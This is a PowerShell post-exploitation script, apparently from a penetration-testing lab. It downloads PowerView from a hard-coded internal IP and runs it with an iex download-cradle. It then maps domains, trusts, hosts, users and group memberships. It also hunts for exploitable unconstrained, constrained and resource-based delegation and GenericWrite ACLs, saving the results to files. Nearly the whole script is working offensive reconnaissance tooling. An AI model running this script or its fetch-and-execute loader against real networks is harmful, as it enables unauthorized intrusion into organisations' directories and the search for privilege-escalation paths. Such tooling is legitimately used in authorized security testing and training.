<#
.SYNOPSIS
    Enumerates domain computers, users, trusts; outputs aligned tables to files; displays aggregates.
.DESCRIPTION
    - Loads PowerView
    - Discovers primary and trusted domains
    - Generates per-domain files:
      * <domain>_computers.txt
      * <domain>_users.txt
      * <domain>_unconstrained.txt
      * <domain>_constrained.txt
      * <domain>_rbcd.txt
    - Aggregates:
      * potential_users.txt (with Groups column)
      * etc_hosts.txt (aligned, no headers)
    - Displays all with aligned columns and filenames
#>

# Configuration
$PowerViewURL = 'http://192.168.45.218/PowerView.ps1'

# Load PowerView
Write-Host 'Loading PowerView...' -ForegroundColor Magenta
try {
    iex (New-Object Net.WebClient).DownloadString($PowerViewURL)
    Write-Host 'PowerView loaded!' -ForegroundColor Green
} catch {
    Write-Host 'Error: Cannot load PowerView.' -ForegroundColor Red
    exit 1
}

# Discover domains
$primary = (Get-NetDomain).Name
$trusts  = Get-DomainTrustMapping | Select-Object SourceName,TargetName
$domains = @($primary) + ($trusts | ForEach-Object { @($_.SourceName, $_.TargetName) })
$domains = $domains | Where-Object { $_ } | Sort-Object -Unique
Write-Host "Domains: $($domains -join ', ')" -ForegroundColor Cyan

# Reset aggregated files
Remove-Item potential_users.txt, etc_hosts.txt -ErrorAction SilentlyContinue
function Reset-File { param($p) if (Test-Path $p) { Remove-Item $p } }

# Initialize accumulators
$PotentialList = @()
$HostList      = @()

# Process each domain
foreach ($d in $domains) {
    Write-Host ''
    Write-Host "Processing: $d" -ForegroundColor Cyan

    # Prepare per-domain files
    $computersFile = "${d}_computers.txt"
    $usersFile     = "${d}_users.txt"
    Reset-File $computersFile; Reset-File $usersFile

    # Enumerate computers and build objects
    try {
        $rawComps = Get-NetComputer -Domain $d | Select-Object Name, DnsHostName, OperatingSystem
    } catch {
        Write-Host "  Skipped $d (unreachable)" -ForegroundColor Red
        continue
    }
    $computers = $rawComps | ForEach-Object {
        try {
            $ip = Resolve-DnsName -Name $_.DnsHostName -Type A -ErrorAction Stop |
                  Select-Object -ExpandProperty IPAddress -First 1
        } catch {
            $ip = ''
        }
        [PSCustomObject]@{
            Name = $_.Name
            FQDN = $_.DnsHostName
            OS   = ($_.OperatingSystem -replace '\s+', ' ')
            IP   = $ip
        }
    }

    # Write aligned computers table
    $computers |
      Format-Table Name, FQDN, OS, IP -AutoSize |
      Out-String -Width 120 |
      Out-File $computersFile -Encoding utf8
    Write-Host '  Computers file:' -NoNewline; Write-Host " $computersFile" -ForegroundColor Yellow
    Get-Content $computersFile | ForEach-Object { Write-Host "    $_" }

    # Accumulate for hosts entries
    $HostList += $computers |
                 Select-Object IP,
                               @{Name='Hostname';Expression={$_.FQDN}},
                               @{Name='Alias';Expression={$_.Name}}

    # Enumerate users
    $users = Get-NetUser -Domain $d |
             Select-Object @{n='User';e={$_.SamAccountName}}, LastLogon

    # Write aligned users table
    $users |
      Format-Table User, LastLogon -AutoSize |
      Out-String -Width 120 |
      Out-File $usersFile -Encoding utf8
    Write-Host '  Users file:' -NoNewline; Write-Host " $usersFile" -ForegroundColor Yellow
    Get-Content $usersFile | ForEach-Object { Write-Host "    $_" }

    # ——————————————
    # Delegation Checks for this domain:

    # 1) Unconstrained delegation → just output machine Name
    $uFile = "${d}_unconstrained.txt"
    Get-DomainComputer -Domain $d -Unconstrained |
      Select-Object -ExpandProperty Name |
      Out-File $uFile -Encoding utf8
    Write-Host "  Unconstrained delegations: $uFile" -ForegroundColor Yellow
    Get-Content $uFile | ForEach-Object { Write-Host "    $_" }
    Write-Host ""

    # 2) Constrained delegation → Name : allowed-to-delegate-to targets
    $cFile = "${d}_constrained.txt"
    Get-DomainUser -Domain $d -TrustedToAuth |
      ForEach-Object {
          "{0} : {1}" -f $_.Name, (($_.'msds-allowedtodelegateto') -join ', ')
      } |
      Out-File $cFile -Encoding utf8
    Write-Host "  Constrained delegations: $cFile" -ForegroundColor Yellow
    Get-Content $cFile | ForEach-Object { Write-Host "    $_" }
    Write-Host ""

    # 3) Resource-Based Constrained Delegation (RBCD)
    $rFile = "${d}_rbcd.txt"
    Get-DomainComputer -Domain $d |
      Get-ObjectAcl -ResolveGUIDs |
      ForEach-Object {
          $_ | Add-Member -NotePropertyName Identity `
                        -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.Value) `
                        -Force
          $_
      } |
      Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' } |
      Out-File $rFile -Encoding utf8
    Write-Host "  RBCD delegations: $rFile" -ForegroundColor Yellow
    Get-Content $rFile | ForEach-Object { Write-Host "    $_" }
    Write-Host ""
    # ——————————————

    # Accumulate potential active users with Groups
    $activeUsers = $users |
                   Where-Object { $_.LastLogon -is [DateTime] -and $_.LastLogon.Year -gt 1900 }
    if ($activeUsers) {
        foreach ($u in $activeUsers) {
            try {
                $groups = Get-DomainGroup -MemberIdentity $u.User -Domain $d |
                          Select-Object -ExpandProperty SamAccountName
                $groupList = $groups -join ','
            } catch {
                $groupList = ''
            }
            $PotentialList += [PSCustomObject]@{
                Domain    = $d
                User      = $u.User
                LastLogon = $u.LastLogon
                Groups    = $groupList
            }
        }
    }
}

# Write aligned potential users table (with Groups)
$PotentialList |
  Format-Table Domain, User, LastLogon, Groups -AutoSize |
  Out-String -Width 200 |
  Out-File 'potential_users.txt' -Encoding utf8
Write-Host "`nPotential Users file: potential_users.txt" -ForegroundColor Yellow
Get-Content 'potential_users.txt' | ForEach-Object { Write-Host "  $_" }

# Write aligned hosts entries table (no headers)
$HostList |
  Format-Table IP, Hostname, Alias -AutoSize -HideTableHeaders |
  Out-String -Width 120 |
  Out-File 'etc_hosts.txt' -Encoding utf8
Write-Host "`nHosts Entries file: etc_hosts.txt" -ForegroundColor Yellow
Get-Content 'etc_hosts.txt' | ForEach-Object { Write-Host "  $_" }

Write-Host 'Done!' -ForegroundColor Magenta

